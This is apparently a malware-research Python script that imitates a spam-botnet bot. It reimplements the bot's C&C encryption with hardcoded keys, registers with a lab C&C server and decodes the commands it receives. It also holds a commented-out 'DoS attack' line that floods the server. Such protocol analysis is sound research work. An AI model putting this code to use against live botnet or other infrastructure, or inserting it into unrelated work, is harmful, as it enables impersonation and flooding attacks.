# cipher.py

"""
Description:

This program connects and communicates with the botnet C&C.

It implements the CBC encryption scheme as in pcrypt.c

Modules:

    c_types_defines : Defines ctypes structures
    termcolor       : For printing out colored text, $pip install termcolor

"""

import sys
import array
import socket

from c_types_defines import *
from termcolor import cprint

# CBC keys
PKEY_SIZE = 29
encrypt_key = "Poshel-ka ti na hui drug aver"
decrypt_key = "reva gurd iuh an it ak-lehsoP"

# C&C connection IP and Port number
# Test: nc -l 8080 | hexdump -C
#HOST = "127.0.0.1"
HOST = "172.16.211.134"
PORT = 43242

# C&C commands
RC_SLEEP    = 1
RC_GETWORK  = 2
RC_RESTART  = 3
RC_UPDATE   = 4
RC_BID      = 5
RC_TEMPLATE = 6
RC_CONFIG   = 7
RC_MAILFROM = 8
RC_ACCOUNTS = 9

# Operation on each block of size PKEY_SIZE
def pcrypt_block(key, block):
    # Python strings are immutable
    b = array.array("B", block)
    k = array.array("B", key)

    # XOR
    for i in range(0, PKEY_SIZE):
        b[i] ^= k[i]

    # ROT (swap each character in array symmetrically)
    for i in range(0, PKEY_SIZE/2):
        t = b[i]
        b[i] = b[PKEY_SIZE - 1 -i]
        b[PKEY_SIZE - 1 - i] = t

    return b.tostring()

# Divide buffer into n blocks
def blocks_of_n(buf, n):
    while buf:
        yield buf[:n]
        buf = buf[n:]

# Bitwise not each letter in string
def bitwise_not(block):
    b = array.array("B", block)
    for i in range(0, len(b)):
        b[i] ^= 0xff
    return b.tostring()

# Given message, divide into blocks and process
def pcrypt(key, buf, size):
    # Split buf into blocks of size PKEY_SIZE
    blocks = list(blocks_of_n(buf, PKEY_SIZE))

    off = -1

    # If size > PKEY_SIZE : process each block
    for off in range(0, size / PKEY_SIZE):
        blocks[off] = pcrypt_block(key, blocks[off])

        # For each odd number of offsets, bitwise not
        if off % 2 == 1:
            blocks[off] = bitwise_not(blocks[off])

    # If size < PKEY_SIZE or process remainder block
    if size % PKEY_SIZE != 0:
        blocks[off+1] = bitwise_not(blocks[off+1])

    return "".join(blocks)

# Encrypt buffer, size = len(buf)
def pencrypt(buf, size):
    return pcrypt(encrypt_key, buf, size)

# Decrypt buffer, size = len(buf)
def pdecrypt(buf, size):
    return pcrypt(decrypt_key, buf, size)

# Dump combined hex/ascii rep of a packed binary string
# [Credit: code.activestate.com]
FILTER = "".join([(len(repr(chr(x))) == 3) and chr(x) or "." for x in range(256)])

def hexdump(src, length=16):
    result = []
    
    for i in xrange(0, len(src), length):
        s = src[i:i+length]
	hexa = " ".join(["%02X" % ord(x) for x in s])
	printable = s.translate(FILTER)
	result.append("%04X\t%-*s\t%s\n" % (i, length*3, hexa, printable))

    return "".join(result)

def main():
    # Socket configurations
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.settimeout(3.0) # Set 3s timeout

    # Connect
    s.connect((HOST, PORT))

    cprint("\n[*] Sending data to " + HOST + " : " + str(PORT) + " (hexdump below)\n", "green")

    # Initialise bot_info, bot_rheader, botbulk_info structures
    bot_info = BOT_INFO()
    bot_rheader = BOT_RHEADER()
    botbulk_info = BOTBULK_INFO()

    # Populate bot_rheader structure
    bot_rheader.bid = 0
    bot_rheader.iplocal = 2886783745 # Should be INT
    bot_rheader.botver = 116
    bot_rheader.confver = 1
    bot_rheader.mfver = 1
    bot_rheader.winver =1
    bot_rheader.flags = 1
    bot_rheader.smtp = 1
    bot_rheader.size = 32

    # Conversion: Structure -> Bytes (Str)
    #bot_info.bufrecv = buffer(bot_rheader)[:] # Same as pack()
    bufrecv = buffer(bot_rheader)[:]
    bufrecv_enc = pencrypt(bufrecv, len(bufrecv)) # Try encrypting

    # Populate bot_info structure
    bot_info.ip = "\254\020\323\001"
    bot_info.have_ip = 1
    bot_info.bufrecv = bufrecv_enc
    bot_info.bufsize = 32
    
    """
    bot_info.bufsend = ""
    bot_info.bufdata = ""
    bot_info.bufsmall = 10000

    bot_info.id = 0
    bot_info.bid = 0
    bot_info.sd = 5
    bot_info.timer = 2
    bot_info.state = 2
    bot_info.blackliststatus = 0
    bot_info.bshcommand = 0

    bot_info.flags = 0

    bot_info.botbulk = pointer(botbulk_info)

    # Statistics
    bot_info.bsent = 0
    bot_info.bnouser = 0
    bot_info.bunlucky = 0
    bot_info.bunksmtpansw = 0
    bot_info.bblacklisted = 0
    bot_info.bmailfrombad = 0
    bot_info.bgraylisted = 0
    bot_info.bnomx = 0
    bot_info.bnomxip = 0
    bot_info.bnoaliveip = 0
    bot_info.bsmtptimeout = 0
    bot_info.bconnect = 0
    bot_info.brecv = 0
    bot_info.bbotmailtimeout = 0
    bot_info.bspammessage = 0
    bot_info.bnohostname = 0
    bot_info.blckmx = 0

    bot_info.captcha_good = 0
    bot_info.captcha_total = 0

    refbulk = (c_byte * 4)()
    bot_info.refbulk = cast(refbulk, POINTER(c_int))
    bot_info.refbulk_size = 0
    """

    # Send
    print hexdump(buffer(bot_info)[:])
    s.sendall(buffer(bot_info)[:])
    cprint("[+] Sent! Now waiting to receive data...\n", "green")

    # Initialise recv buffer
    buf = ""

    # Listen on host
    while True:

        try:
            # Try receiving data
            rcvmsg = s.recv(1024)

            # Check whether connection is closed
	    if rcvmsg == "":
	        break
	
            # Got some data!
            sys.stdout.write("[+] Received: ")

            # Interpret command
            cmd = ord(rcvmsg[0])

            if   cmd == RC_SLEEP:
                cprint("RC_SLEEP", "cyan")
            elif cmd == RC_GETWORK:
                cprint("RC_GETWORK", "cyan")
            elif cmd == RC_RESTART:
                cprint("RC_RESTART", "cyan")
            elif cmd == RC_UPDATE:
                cprint("RC_UPDATE", "cyan")
            elif cmd == RC_BID:
                cprint("RC_BID", "cyan")
            elif cmd == RC_TEMPLATE:
                cprint("RC_TEMPLATE", "cyan")
            elif cmd == RC_CONFIG:
                cprint("RC_CONFIG", "cyan")
            elif cmd == RC_MAILFROM:
                cprint("RC_MAILFROM", "cyan")
            elif cmd == RC_ACCOUNTS:
                cprint("RC_ACCOUNTS", "cyan")

	    print hexdump(rcvmsg)

            # Store data in buffer (for later use)
            buf += rcvmsg

        except socket.timeout:

            # Timed out on receiving data: 
            # Let's check out the contents of recv buffer (if not empty)
            if buf:
                # Decrypt recv buffer
                #dec = pdecrypt(buf, len(buf))
                #print "[+] Decrypted:\n", dec, "\n"

                # Clear recv buffer
                buf = ""
                cprint("[*] Listening for incoming data (press Ctrl+C to quit)\n", "green")
            
            # DoS attack
            #s.sendall(buffer(bot_info)[:] * 100)
            
    # Close socket
    s.close()

if __name__ == "__main__":
    main()

